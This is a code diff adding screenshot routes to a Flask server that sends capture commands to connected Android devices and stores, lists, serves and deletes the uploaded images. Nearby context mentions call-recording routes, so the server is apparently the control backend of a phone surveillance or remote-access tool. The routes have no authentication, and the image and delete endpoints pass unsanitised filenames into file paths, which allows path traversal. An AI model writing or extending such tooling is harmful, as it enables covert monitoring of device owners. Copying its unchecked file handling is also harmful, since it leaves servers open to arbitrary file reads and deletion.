@@ -58,6 +58,189 @@ def get_server_ip():
     except:
         return "localhost:5000"
 
+# ================== SCREENSHOT FEATURE ROUTES ==================
+
+@app.route('/screenshot', methods=['POST'])
+def take_screenshot():
+    """Send screenshot command to device"""
+    try:
+        data = request.json
+        device_id = data.get('device_id')
+        command_id = str(uuid.uuid4())  # Unique ID for this screenshot command
+        
+        print(f"📸 Screenshot command received for device: {device_id}, Command ID: {command_id}")
+
+        if not device_id:
+            return jsonify({'status': 'error', 'message': 'Device ID required'}), 400
+
+        # Initialize command tracking
+        screenshot_commands[command_id] = {
+            'device_id': device_id,
+            'status': 'pending',
+            'timestamp': datetime.now(),
+            'image_path': None
+        }
+
+        # Send command to device
+        if device_id in commands_queue:
+            command_data = {
+                'type': 'screenshot',
+                'command_id': command_id
+            }
+            commands_queue[device_id].append(json.dumps(command_data))
+            
+            print(f"✅ Screenshot command sent to device {device_id}")
+            
+            return jsonify({
+                'status': 'success',
+                'message': 'Screenshot command sent to device',
+                'command_id': command_id
+            })
+        else:
+            screenshot_commands[command_id]['status'] = 'failed'
+            return jsonify({
+                'status': 'error', 
+                'message': 'Device not connected'
+            }), 404
+
+    except Exception as e:
+        print(f"❌ Screenshot command error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/screenshot/upload', methods=['POST'])
+def upload_screenshot():
+    """Upload screenshot from Android app"""
+    try:
+        print("🖼️ Screenshot upload request received")
+        
+        # Get data from request
+        device_id = request.form.get('device_id', 'unknown')
+        command_id = request.form.get('command_id', 'unknown')
+        screenshot_file = request.files.get('screenshot')
+        
+        print(f"📱 Device: {device_id}, Command ID: {command_id}")
+
+        if not screenshot_file:
+            return jsonify({'status': 'error', 'message': 'No screenshot file'}), 400
+
+        # Generate filename
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"screenshot_{device_id}_{timestamp}.png"
+        filepath = os.path.join(SCREENSHOTS_DIR, filename)
+
+        # Save screenshot file
+        screenshot_file.save(filepath)
+        file_size = os.path.getsize(filepath)
+
+        # Update command status
+        if command_id in screenshot_commands:
+            screenshot_commands[command_id]['status'] = 'completed'
+            screenshot_commands[command_id]['image_path'] = filepath
+            screenshot_commands[command_id]['completed_at'] = datetime.now()
+
+        # Store file info
+        file_info = {
+            'filename': filename,
+            'device_id': device_id,
+            'upload_time': time.time(),
+            'size': file_size,
+            'type': 'screenshot',
+            'command_id': command_id,
+            'file_path': filepath
+        }
+        uploaded_files.append(file_info)
+
+        print(f"✅ Screenshot uploaded: {filename} from device {device_id}, size: {file_size} bytes")
+
+        return jsonify({
+            'status': 'success',
+            'message': 'Screenshot uploaded successfully',
+            'filename': filename,
+            'command_id': command_id,
+            'size': file_size
+        })
+
+    except Exception as e:
+        print(f"❌ Screenshot upload error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/screenshot/status/<command_id>', methods=['GET'])
+def get_screenshot_status(command_id):
+    """Get status of screenshot command"""
+    try:
+        if command_id in screenshot_commands:
+            command_data = screenshot_commands[command_id]
+            return jsonify({
+                'status': 'success',
+                'command_status': command_data['status'],
+                'device_id': command_data['device_id'],
+                'timestamp': command_data['timestamp'].isoformat(),
+                'image_path': command_data.get('image_path')
+            })
+        else:
+            return jsonify({'status': 'error', 'message': 'Command not found'}), 404
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/screenshot/list', methods=['GET'])
+def list_screenshots():
+    """Get all screenshots"""
+    try:
+        screenshots = [f for f in uploaded_files if f.get('type') == 'screenshot']
+        sorted_screenshots = sorted(screenshots, key=lambda x: x['upload_time'], reverse=True)
+        
+        return jsonify({
+            'status': 'success',
+            'screenshots': sorted_screenshots,
+            'count': len(sorted_screenshots)
+        })
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/screenshot/device/<device_id>', methods=['GET'])
+def get_device_screenshots(device_id):
+    """Get screenshots for specific device"""
+    try:
+        device_screenshots = [f for f in uploaded_files if f['device_id'] == device_id and f.get('type') == 'screenshot']
+        sorted_screenshots = sorted(device_screenshots, key=lambda x: x['upload_time'], reverse=True)
+        
+        return jsonify({
+            'status': 'success',
+            'screenshots': sorted_screenshots,
+            'count': len(sorted_screenshots)
+        })
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/screenshot/image/<filename>', methods=['GET'])
+def get_screenshot_image(filename):
+    """Serve screenshot image"""
+    try:
+        filepath = os.path.join(SCREENSHOTS_DIR, filename)
+        if not os.path.exists(filepath):
+            return jsonify({'status': 'error', 'message': 'Screenshot not found'}), 404
+            
+        return send_file(filepath, mimetype='image/png')
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/screenshot/delete/<filename>', methods=['DELETE'])
+def delete_screenshot(filename):
+    """Delete screenshot"""
+    try:
+        filepath = os.path.join(SCREENSHOTS_DIR, filename)
+        if os.path.exists(filepath):
+            os.remove(filepath)
+            # Remove from uploaded_files list
+            global uploaded_files
+            uploaded_files = [f for f in uploaded_files if not (f['filename'] == filename and f.get('type') == 'screenshot')]
+            print(f"✅ Screenshot deleted: {filename}")
+            return jsonify({'status': 'success', 'message': 'Screenshot deleted'})
+        else:
+            return jsonify({'status': 'error', 'message': 'Screenshot not found'}), 404
+    except Exception as e:
+        print(f"❌ Delete screenshot error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
 # ================== CALL RECORDING ROUTES ==================
 
